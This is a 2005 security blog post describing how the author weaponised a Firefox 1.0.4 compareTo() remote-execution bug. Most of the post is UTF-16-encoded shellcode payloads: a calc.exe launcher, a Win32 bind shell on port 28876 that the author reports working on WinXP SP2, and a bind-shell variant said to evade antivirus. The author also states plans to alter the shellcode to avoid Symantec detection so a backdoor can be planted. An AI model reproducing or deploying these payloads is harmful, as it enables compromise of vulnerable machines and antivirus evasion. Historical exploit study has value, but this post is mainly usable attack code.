---
id: 12
title: Fun w/ FireFox compareTo() Remote Execution
date: 2005-12-15T21:33:00+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=12
permalink: /?p=12
blogger_blog:
  - informationintoxication.blogspot.com
blogger_author:
  - Devinhttp://www.blogger.com/profile/15793900111446118223noreply@blogger.com
blogger_permalink:
  - /2005/12/fun-w-firefox-compareto-remote_15.html
categories:
  - Uncategorized
tags:
  - Buffer Overflow
---
I love firefox, but just could not resist this.

A vulnerbility was found in Mozilla Firefox <= 1.04 when using the
  
compareTo() function.
  
<http://www.milw0rm.com/id.php?id=1369>

You can find older versions of FireFox for testing here.
  
<http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/>

The exploit payload contained a return(Just would close the browser).
  
And what fun is that?

// Payload &#8211; Just return..
  
var payLoadCode=unescape(&#8220;%u9090%u90C3&#8221;);

So I thought lets actually execute some abritrary code.

The thing that makes it hard is we cannot just use normal shellcode. We
  
have to convert it to UTF-16 so the browser can execute it. I suppose
  
UTF-8 would work also.

For Example:

\x29 would be %u785c%u3932

So here we go, create the shellcode and encode it to UTF-16.
  
How about something simple like calc.exe.

I found a shellcode encoder. I have had mixed results but you can find it here.
  
<http://www.milw0rm.com/id.php?id=656>

// Payload &#8211; Calc.exe
  
var payLoadCode=unescape(
  
&#8220;%u5053%u5053%u9090%uC929%uE983%uD9DB%uD9EE%u2474&#8221; +
  
&#8220;%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55&#8221; +
  
&#8220;%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6&#8221; +
  
&#8220;%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69&#8221; +
  
&#8220;%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D&#8221; +
  
&#8220;%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8&#8221; +
  
&#8220;%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9&#8221; +
  
&#8220;%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40&#8221; +
  
&#8220;%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6&#8221; +
  
&#8220;%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7&#8243;+
  
&#8220;%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC&#8221; +
  
&#8220;%uCC4A%uD0FF&#8221;);

Loaded the page, firefox shutdown and calc.exe poped-up. We can execute!
  
(tested on WinXP SP2)

While calc.exe was funny not to useful.

Lets bind a port so we can get a shell.

I tried creating different shellcode, things such as adding a user,port
  
binding, cmd exec, and reverse shells, In both Linux and Windows. The
  
shellcode was very touchy and had mixed results after encoding to
  
UTF-16.

This win32 bind shell code did work on WinXP SP2 from SkyLined.

// Payload &#8211; Win32 bindshell (port 28876) &#8211; SkyLined
  
var payLoadCode=unescape(&#8220;%u4343%u4343%u43eb&#8221;+
  
&#8220;%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b%u0120%u31ea&#8221;+
  
&#8220;%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf%u01ac%u85c7&#8243;+
  
&#8220;%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b&#8221;+
  
&#8220;%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64&#8243;+
  
&#8220;%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c&#8221;+
  
&#8220;%u6850%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe&#8221;+
  
&#8220;%uff90%uffff%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0&#8243;+
  
&#8220;%u40c4%ubb50%u7d22%u7dab%u75e8%uffff%u31ff%u50c0%u5050&#8243;+
  
&#8220;%u4050%u4050%ubb50%u55a6%u7934%u61e8%uffff%u89ff%u31c6&#8243;+
  
&#8220;%u50c0%u3550%u0102%ucc70%uccfe%u8950%u50e0%u106a%u5650&#8243;+
  
&#8220;%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650%ud3bb%u58fa&#8221;+
  
&#8220;%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56%uf347%uc656&#8243;+
  
&#8220;%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1&#8243;+
  
&#8220;%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353&#8243;+
  
&#8220;%u5353%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353&#8243;+
  
&#8220;%u5343%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe&#8221;+
  
&#8220;%u5bff%uc031%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff&#8221;+
  
&#8220;%uef87%u12bb%u6d6b%ue8d0%ufec2%uffff%uc483%u615c%u89eb&#8221;);

Opened the page in FireFox and telneted to port 28876

Although, Symantec did see it as being a Trojan about one minute later.

I will look into changing the shellcode a bit in hope of not triggering Symantec.
  
Otherwise you would only have one minute after exploit to plant a backdoor.

The exploit uses a method called spraying the stack. Its actually a
  
pretty cool method by SkyLined to find a predictable address.

I will continue to work on this when time permits, If anyone is
  
interesed I would like to see other UTF-16 encoded shellcode that
  
works.

Here is a UTF-16 Payload by SkyLined that is not suppose to set off virus scanners.
  
I have not tested this one yet.

payLoadCode = unescape(\&#8221;%u4343\&#8221;+\&#8221;%u4343\&#8221;+\&#8221;%u43eb&#8221;.
  
&#8220;%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b%u0120%u31ea&#8221;.
  
&#8220;%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf%u01ac%u85c7&#8221;.
  
&#8220;%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b&#8221;.
  
&#8220;%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64&#8221;.
  
&#8220;%u3040%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c&#8221;.
  
&#8220;%u6850%u3233%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe&#8221;.
  
&#8220;%uff90%uffff%uef89%uc589%uc481%ufe70%uffff%u3154%ufec0&#8221;.
  
&#8220;%u40c4%ubb50%u7d22%u7dab%u75e8%uffff%u31ff%u50c0%u5050&#8221;.
  
&#8220;%u4050%u4050%ubb50%u55a6%u7934%u61e8%uffff%u89ff%u31c6&#8221;.
  
&#8220;%u50c0%u3550%u0102%ucc70%uccfe%u8950%u50e0%u106a%u5650&#8221;.
  
&#8220;%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650%ud3bb%u58fa&#8221;.
  
&#8220;%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56%uf347%uc656&#8221;.
  
&#8220;%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1&#8221;.
  
&#8220;%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353&#8221;.
  
&#8220;%u5353%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353&#8221;.
  
&#8220;%u5343%u534b%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe&#8221;.
  
&#8220;%u5bff%uc031%u5048%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff&#8221;.
  
&#8220;%uef87%u12bb%u6d6b%ue8d0%ufec2%uffff%uc483%u615c%u89eb\&#8221;);

Below are some links to more info.

<http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0104.html>
  
[http://www.edup.tudelft.nl/~bjwever/advisory\_msie\_R6025.html.php](http://www.edup.tudelft.nl/~bjwever/advisory_msie_R6025.html.php)